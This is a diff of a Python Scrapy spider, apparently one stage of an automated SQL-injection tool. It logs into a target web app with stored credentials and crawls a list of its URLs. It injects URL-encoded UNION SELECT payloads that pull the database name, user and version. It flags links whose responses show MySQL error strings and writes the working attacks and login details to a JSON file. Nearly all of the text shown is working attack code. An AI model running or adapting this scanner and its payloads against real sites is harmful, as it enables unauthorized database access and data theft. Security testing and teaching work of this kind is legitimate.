@@ -22,11 +22,26 @@ actual_payloads = ["%27+and+1=2+union+select+1,2,database%28%29,user%28%29,5,6,v
 "%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+",
 "%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29+--+"]
 
-links = open('links.txt','r')
+#links = open('links.txt','r')
+
+links = open('linksToAttack.txt','w')
+
+with open('data.json') as data_file:
+    data = json.load(data_file)
+
+length = len(data)
+for i in range(0,length-1):
+    jsonval = json.dumps(data[i])
+    data2 = json.loads(jsonval)
+    links.write(data2['url']+"\n")
+links.close()
+links = open('linksToAttack.txt', 'r')
 urls = links.readlines()
 links.close()
+##print urls
+login_reqd = "false"
 items = []
-fin = []
+fin = {}
 dic = {}
 tempResponse = ""
 searchterms = ["mysql error","sql syntax", "mysql server version", "unknown column","access violation","SQLSTATE", 
@@ -36,37 +51,43 @@ class step3(Spider):
 	name = "step3"
 	with open('input.json') as data_file:
 		data = json.load(data_file)
-	start_urls = [data['appurl']]
+	start_urls = [data['starturl']]
+	login_urls = [data['loginurl']]
 	login_user = [data['username']]
 	login_pass = [data['password']]
 	params = []
 	
 	def parse(self, response):
-		print response
+		for temp in urls:
+			if self.start_urls[0] in temp:
+				yield Request(url=temp, meta={'temp':temp} , callback=self.save_original_resp)
+				
+		#print response
 		args, url, method = fill_login_form(self.start_urls[0], response.body, self.login_user[0], self.login_pass[0])
-		print args
-		
+		#print args
+		login = "true"
 		#for x in query_string.split('&'):
 			#y = x.split('=')
 			#self.params.append((y[0], y[1]))
 		
-		return FormRequest(url, method=method, formdata=args, callback=self.after_login)
+		yield FormRequest(url, method=method, formdata=args, callback=self.after_login)
+		return
 
 	def __init__(self):
 		dispatcher.connect(self.spider_closed, signals.spider_closed)
 
 	def after_login(self, response):
  		if (((("ERROR: Invalid username") or ("The username/password combination you have entered is invalid"))	in response.body) or (response.url is self.start_urls[0])):
-			self.log("Login failed", level=log.ERROR)
+			#self.log("Login failed", level=log.ERROR)
 			yield
 		# continue scraping with authenticated session...
 		else:
-			self.log("Login succeed!", level=log.DEBUG)
-			print response.url
+			#self.log("Login succeed!", level=log.DEBUG)
+			#print response.url
 			'''f = open("app4login.html", "w")
 			f.write(response.body)
 			f.close()'''
-			print "response end!!\n"
+			#print "response end!!\n"
 			for temp in urls:
 					if self.start_urls[0] in temp:
 							yield Request(url=temp, meta={'temp':temp} , callback=self.save_original_resp)
@@ -80,15 +101,15 @@ class step3(Spider):
 		return 
 	'''
 	def after_login(self, response):
-		print "i am here" 
+		#print "i am here" 
 		temp = login_url + attack_url
-		#print temp + ": " + str(self.params)
+		##print temp + ": " + str(self.params)
 		return FormRequest(temp, formdata=self.params, callback=self.save_original_resp)
 	'''
 	def save_original_resp(self, response):
 		temp = response.request.meta['temp']
 		newfile = open('linksWithFalsePayloads.txt','a')
-		#print "Response: " + response.url
+		##print "Response: " + response.url
 		file = open("original_response.html", "w")
 		file.write(response.body)
 		original = response.body
@@ -122,7 +143,7 @@ class step3(Spider):
 		original = response.request.meta['original']
 		#if searchterms in response.body:
 		if any(term in response.body.lower() for term in searchterms):
-			self.log("\tVulnerable link: " + response.url, level=log.INFO)
+			#self.log("\tVulnerable link: " + response.url, level=log.INFO)
 			#This link is vulnerable lets do the actual attack
 			if (temp not in items):
 					items.append(temp)
@@ -147,7 +168,7 @@ class step3(Spider):
 		file4 = open("justToCheck.txt","a")
 		file4.write(response.url)
 		file4.close()
-		print "#############################################"
+		#print "#############################################"
 		if not attackResponse == original:
 			if not any(term in response.body.lower() for term in searchterms):
 				file4 = open("actualAttacks.txt","a")
@@ -155,7 +176,7 @@ class step3(Spider):
 				file4.close()
 				dic1 ={}
 				dic1["method"] = "GET" #Pending
-				dic1["LoginRequired"] = "true" #Pending
+				dic1["LoginRequired"] = login_reqd
 				dic1["username"] = self.login_user[0]
 				dic1["password"] = self.login_pass[0]
 				#OtherParameterToWrite #Pending
@@ -164,7 +185,8 @@ class step3(Spider):
 		return
 
 	def spider_closed(self, spider):
-		fin.append(dic)
-		f = open("attack.json", 'w')
+		fin = dict(dic)
+		f = open("step3output.json", 'w')
 		f.write(json.dumps(fin,indent= 4, sort_keys = True))
 		f.close()
+		
